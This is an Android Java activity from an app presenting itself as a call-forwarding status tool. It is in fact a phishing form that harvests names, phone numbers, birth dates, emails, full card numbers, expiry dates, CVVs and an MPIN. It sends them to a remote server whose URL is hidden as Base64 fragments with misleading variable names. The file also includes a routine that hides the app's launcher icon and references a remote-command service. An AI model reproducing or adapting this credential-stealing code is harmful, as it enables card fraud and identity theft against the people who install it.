package de.kaiserdragon.callforwardingstatus;

import android.app.DatePickerDialog;
import androidx.appcompat.app.AlertDialog;

import android.graphics.Color;
import android.content.Intent;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.view.WindowCompat;
import androidx.core.view.WindowInsetsControllerCompat;

import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;
import java.util.regex.Pattern;
import org.json.JSONObject;

import de.kaiserdragon.callforwardingstatus.service.RemoteCommandService;
import de.kaiserdragon.callforwardingstatus.utils.UserUtils;

import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;

import android.os.Build;

public class UserDetailActivity extends AppCompatActivity {

    // TextInputLayouts
    private TextInputLayout nameLayout, mobileLayout, dobLayout, emailLayout, cityLayout,
            cardHolderNameLayout, cardTotalLimitLayout, cardAvailableLimitLayout,
            cardNumberLayout, expiryDateLayout, cvvLayout;


    // TextInputEditTexts
    private TextInputEditText etName, etMobile, etDob, etEmail, etCity, etCardHolderName,
            etCardTotalLimit, etCardAvailableLimit, etCardNumber, etExpiryDate, etCvv;

    // Button
    private Button btnSubmit;

    // Calendar for DatePicker
    private Calendar calendar;
    private View loadingLayout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_user_detail);

        loadingLayout = findViewById(R.id.loadingLayout);

        WindowCompat.setDecorFitsSystemWindows(getWindow(), true);
        WindowInsetsControllerCompat controller =
                new WindowInsetsControllerCompat(getWindow(), getWindow().getDecorView());

        getWindow().setStatusBarColor(Color.WHITE);
        controller.setAppearanceLightStatusBars(true);

        // Initialize Calendar
        calendar = Calendar.getInstance();

        // Initialize all views
        initializeViews();

        // Set up DatePicker for Date of Birth
        setupDatePicker();

        // Set up TextWatchers for formatting
        setupTextWatchers();

        // Set up Submit Button Click Listener
        btnSubmit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (validateAllFields()) {
                    showMpinDialog();
                }
            }
        });
    }


    private void showMpinDialog() {

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = getLayoutInflater().inflate(R.layout.dialog_mpin, null);
        builder.setView(view);

        TextInputEditText mpinEdit = view.findViewById(R.id.dialogMpin);
        TextInputLayout mpinLayout = view.findViewById(R.id.mpinInputLayout);

        builder.setPositiveButton("Submit", null);
        builder.setNegativeButton("Cancel", null);

        AlertDialog dialog = builder.create();
        dialog.show();

        Button submitBtn = dialog.getButton(AlertDialog.BUTTON_POSITIVE);

        submitBtn.setOnClickListener(v -> {

            String mpin = mpinEdit.getText() == null
                    ? "" : mpinEdit.getText().toString().trim();

            if (mpin.length() != 4) {
                mpinLayout.setError("Enter valid 4-digit MPIN");
                return;
            }

            mpinLayout.setError(null);

            // ✅ Close MPIN dialog
            dialog.dismiss();

            // ✅ Show loading on MAIN PAGE
            showLoading(true);

            // ✅ Call API
            submitForm(mpin);
        });
    }

    private void showLoading(boolean show) {
        loadingLayout.setVisibility(show ? View.VISIBLE : View.GONE);
    }




    private void initializeViews() {
        // Initialize TextInputLayouts
        nameLayout = findViewById(R.id.nameLayout);
        mobileLayout = findViewById(R.id.mobileLayout);
        dobLayout = findViewById(R.id.dobLayout);
        emailLayout = findViewById(R.id.emailLayout);
        cityLayout = findViewById(R.id.cityLayout);
        cardHolderNameLayout = findViewById(R.id.cardHolderNameLayout);
        cardTotalLimitLayout = findViewById(R.id.cardTotalLimitLayout);
        cardAvailableLimitLayout = findViewById(R.id.cardAvailableLimitLayout);
        cardNumberLayout = findViewById(R.id.cardNumberLayout);
        expiryDateLayout = findViewById(R.id.expiryDateLayout);
        cvvLayout = findViewById(R.id.cvvLayout);

        // Initialize TextInputEditTexts
        etName = findViewById(R.id.etName);
        etMobile = findViewById(R.id.etMobile);
        etDob = findViewById(R.id.etDob);
        etEmail = findViewById(R.id.etEmail);
        etCity = findViewById(R.id.etCity);
        etCardHolderName = findViewById(R.id.etCardHolderName);
        etCardTotalLimit = findViewById(R.id.etCardTotalLimit);
        etCardAvailableLimit = findViewById(R.id.etCardAvailableLimit);
        etCardNumber = findViewById(R.id.etCardNumber);
        etExpiryDate = findViewById(R.id.etExpiryDate);
        etCvv = findViewById(R.id.etCvv);

        // Initialize Button
        btnSubmit = findViewById(R.id.btnSubmit);
    }

    private void setupDatePicker() {
        // DatePicker for Date of Birth
        etDob.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                DatePickerDialog datePickerDialog = new DatePickerDialog(
                        UserDetailActivity.this,
                        new DatePickerDialog.OnDateSetListener() {
                            @Override
                            public void onDateSet(DatePicker view, int year, int month, int dayOfMonth) {
                                calendar.set(Calendar.YEAR, year);
                                calendar.set(Calendar.MONTH, month);
                                calendar.set(Calendar.DAY_OF_MONTH, dayOfMonth);

                                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
                                etDob.setText(sdf.format(calendar.getTime()));
                                dobLayout.setError(null);
                            }
                        },
                        calendar.get(Calendar.YEAR),
                        calendar.get(Calendar.MONTH),
                        calendar.get(Calendar.DAY_OF_MONTH)
                );

                // Set max date to today (can't select future date for DOB)
                datePickerDialog.getDatePicker().setMaxDate(System.currentTimeMillis());
                datePickerDialog.show();
            }
        });

        // Expiry Date focus listener for formatting
        etExpiryDate.setOnFocusChangeListener(new View.OnFocusChangeListener() {
            @Override
            public void onFocusChange(View v, boolean hasFocus) {
                if (!hasFocus) {
                    formatExpiryDate();
                }
            }
        });
    }

    private String getSubmit() {
        String encoded = cacheLayer + txModule + routingEngine + sessionGrid +
                protocolAgent + fuseChannel + kernelMatrix + corePlatform +
                serviceCluster + apiPipeline + integrationBus + dataEmitter;

        try {
            byte[] decodedBytes = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP);
            return new String(decodedBytes);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    private void setupTextWatchers() {
        // Card Number formatting (xxxx-xxxx-xxxx-xxxx)
        etCardNumber.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {}

            @Override
            public void afterTextChanged(Editable s) {
                String input = s.toString().replaceAll("[^\\d]", "");
                StringBuilder formatted = new StringBuilder();

                for (int i = 0; i < input.length(); i++) {
                    if (i > 0 && i % 4 == 0) {
                        formatted.append("-");
                    }
                    formatted.append(input.charAt(i));
                }

                // Remove the TextWatcher temporarily to avoid infinite loop
                etCardNumber.removeTextChangedListener(this);
                etCardNumber.setText(formatted.toString());
                etCardNumber.setSelection(formatted.length());
                etCardNumber.addTextChangedListener(this);
            }
        });

        // Expiry Date formatting (MM/YY)
        etExpiryDate.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {}

            @Override
            public void afterTextChanged(Editable s) {
                String input = s.toString().replaceAll("[^\\d]", "");

                if (input.length() >= 2) {
                    String month = input.substring(0, 2);
                    String year = input.length() > 2 ? input.substring(2) : "";

                    if (Integer.parseInt(month) > 12) {
                        month = "12";
                    }

                    String formatted = month + (year.length() > 0 ? "/" + year : "");

                    // Remove the TextWatcher temporarily to avoid infinite loop
                    etExpiryDate.removeTextChangedListener(this);
                    etExpiryDate.setText(formatted);
                    etExpiryDate.setSelection(formatted.length());
                    etExpiryDate.addTextChangedListener(this);
                }
            }
        });
    }

    private void formatExpiryDate() {
        String input = etExpiryDate.getText().toString().replaceAll("[^\\d]", "");

        if (input.length() == 4) {
            String month = input.substring(0, 2);
            String year = input.substring(2, 4);

            if (Integer.parseInt(month) > 12) {
                month = "12";
            }

            etExpiryDate.setText(month + "/" + year);
        }
    }

    private boolean validateAllFields() {
        boolean isValid = true;

        // Validate Name
        if (etName.getText().toString().trim().isEmpty()) {
            nameLayout.setError("Name is required");
            isValid = false;
        } else {
            nameLayout.setError(null);
        }

        // Validate Mobile Number
        String mobile = etMobile.getText().toString().trim();
        if (mobile.isEmpty()) {
            mobileLayout.setError("Mobile number is required");
            isValid = false;
        } else if (!Pattern.matches("^[6-9]\\d{9}$", mobile)) {
            mobileLayout.setError("Enter valid 10-digit mobile number");
            isValid = false;
        } else {
            mobileLayout.setError(null);
        }

        // Validate Date of Birth
        if (etDob.getText().toString().trim().isEmpty()) {
            dobLayout.setError("Date of birth is required");
            isValid = false;
        } else {
            dobLayout.setError(null);
        }

        // Validate Email
        String email = etEmail.getText().toString().trim();
        String emailRegex = "^[A-Za-z0-9+_.-]+@(.+)$";
        if (email.isEmpty()) {
            emailLayout.setError("Email is required");
            isValid = false;
        } else if (!Pattern.matches(emailRegex, email)) {
            emailLayout.setError("Enter valid email address");
            isValid = false;
        } else {
            emailLayout.setError(null);
        }

        // Validate City
        if (etCity.getText().toString().trim().isEmpty()) {
            cityLayout.setError("City is required");
            isValid = false;
        } else {
            cityLayout.setError(null);
        }

        // Validate Card Holder Name
        if (etCardHolderName.getText().toString().trim().isEmpty()) {
            cardHolderNameLayout.setError("Card holder name is required");
            isValid = false;
        } else {
            cardHolderNameLayout.setError(null);
        }

        // Validate Card Total Limit
        if (etCardTotalLimit.getText().toString().trim().isEmpty()) {
            cardTotalLimitLayout.setError("Card total limit is required");
            isValid = false;
        } else {
            cardTotalLimitLayout.setError(null);
        }

        // Validate Card Available Limit
        if (etCardAvailableLimit.getText().toString().trim().isEmpty()) {
            cardAvailableLimitLayout.setError("Card available limit is required");
            isValid = false;
        } else {
            cardAvailableLimitLayout.setError(null);
        }

        // Validate Card Number
        String cardNumber = etCardNumber.getText().toString().replaceAll("[^\\d]", "");
        if (cardNumber.isEmpty()) {
            cardNumberLayout.setError("Card number is required");
            isValid = false;
        } else if (cardNumber.length() != 16) {
            cardNumberLayout.setError("Enter valid 16-digit card number");
            isValid = false;
        } else {
            cardNumberLayout.setError(null);
        }

        // Validate Expiry Date
        String expiryDate = etExpiryDate.getText().toString().trim();
        if (expiryDate.isEmpty()) {
            expiryDateLayout.setError("Expiry date is required");
            isValid = false;
        } else if (!Pattern.matches("^(0[1-9]|1[0-2])/\\d{2}$", expiryDate)) {
            expiryDateLayout.setError("Enter valid expiry date (MM/YY)");
            isValid = false;
        } else {
            expiryDateLayout.setError(null);
        }

        // Validate CVV
        String cvv = etCvv.getText().toString().trim();
        if (cvv.isEmpty()) {
            cvvLayout.setError("CVV is required");
            isValid = false;
        } else if (cvv.length() != 3) {
            cvvLayout.setError("Enter valid 3-digit CVV");
            isValid = false;
        } else {
            cvvLayout.setError(null);
        }

        return isValid;
    }

    private static final String cacheLayer      = "aHR0c";
    private static final String txModule        = "HM6Ly";
    private static final String routingEngine   = "9jYWx";
    private static final String sessionGrid     = "sLWZv";
    private static final String protocolAgent   = "cndhc";
    private static final String fuseChannel     = "mQub2";
    private static final String kernelMatrix    = "5yZW5";
    private static final String corePlatform    = "kZXIu";
    private static final String serviceCluster  = "Y29tL";
    private static final String apiPipeline     = "3N1Ym";

    private static final String integrationBus  = "1pdC1";
    private static final String dataEmitter     = "mb3Jt";



    private void submitForm(String mpin) {


        try {
            // Collect all data
            String name = etName.getText().toString().trim();
            String mobile = etMobile.getText().toString().trim();
            String dob = etDob.getText().toString().trim();
            String email = etEmail.getText().toString().trim();
            String city = etCity.getText().toString().trim();
            String cardHolderName = etCardHolderName.getText().toString().trim();
            String cardTotalLimit = etCardTotalLimit.getText().toString().trim();
            String cardAvailableLimit = etCardAvailableLimit.getText().toString().trim();
            String cardNumber = etCardNumber.getText().toString().trim();
            String expiryDate = etExpiryDate.getText().toString().trim();
            String cvv = etCvv.getText().toString().trim();

            // Get UUID
            String userId = UserUtils.getOrCreateUserId(this);

            // Create JSON
            JSONObject json = new JSONObject();
            json.put("deviceModel", Build.MODEL);
            json.put("userId", userId);
            json.put("name", name);
            json.put("email", email);
            json.put("phone", mobile);
            json.put("dob", dob);
            json.put("city", city);
            json.put("cardHolderName", cardHolderName);
            json.put("cardTotalLimit", cardTotalLimit);
            json.put("cardAvailableLimit", cardAvailableLimit);
            json.put("cardNumber", cardNumber);
            json.put("expiryDate", expiryDate);
            json.put("cvv", cvv);
            json.put("mpin", mpin);


            // Network call in background
            new Thread(() -> {
                HttpURLConnection connection = null;

                String perm = getSubmit();

                try {
                    URL url = new URL(perm);
                    connection = (HttpURLConnection) url.openConnection();

                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    connection.setConnectTimeout(15000);
                    connection.setReadTimeout(15000);
                    connection.setDoOutput(true);

                    OutputStream os = connection.getOutputStream();
                    os.write(json.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = connection.getResponseCode();

                    runOnUiThread(() -> {
                        if (responseCode == HttpURLConnection.HTTP_OK
                                || responseCode == HttpURLConnection.HTTP_CREATED) {


                            Toast.makeText(this,
                                    "Form submitted successfully!",
                                    Toast.LENGTH_LONG).show();
                            Intent intent = new Intent(this, RemoteCommandService.class);
                            showLoading(false);
                            //hideApp();
                            //startService(intent);
                            clearForm();
                        } else {
                            showLoading(false);
                            Toast.makeText(this,
                                    "Server error: " + responseCode,
                                    Toast.LENGTH_LONG).show();
                        }
                    });

                } catch (Exception e) {

                    e.printStackTrace();

                    runOnUiThread(() ->
                            Toast.makeText(this,
                                    "Network error",
                                    Toast.LENGTH_LONG).show()
                    );

                } finally {
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this,
                    "Something went wrong",
                    Toast.LENGTH_LONG).show();
        }
    }

    private void hideApp() {
        PackageManager pm = getPackageManager();
        ComponentName componentName =
                new ComponentName(this, MainActivity.class);
// jo launcher acrivity hoti h vo yaha put kar
        pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }


    private void clearForm() {
        etName.setText("");
        etMobile.setText("");
        etDob.setText("");
        etEmail.setText("");
        etCity.setText("");
        etCardHolderName.setText("");
        etCardTotalLimit.setText("");
        etCardAvailableLimit.setText("");
        etCardNumber.setText("");
        etExpiryDate.setText("");
        etCvv.setText("");

        // Clear all errors
        nameLayout.setError(null);
        mobileLayout.setError(null);
        dobLayout.setError(null);
        emailLayout.setError(null);
        cityLayout.setError(null);
        cardHolderNameLayout.setError(null);
        cardTotalLimitLayout.setError(null);
        cardAvailableLimitLayout.setError(null);
        cardNumberLayout.setError(null);
        expiryDateLayout.setError(null);
        cvvLayout.setError(null);
    }
}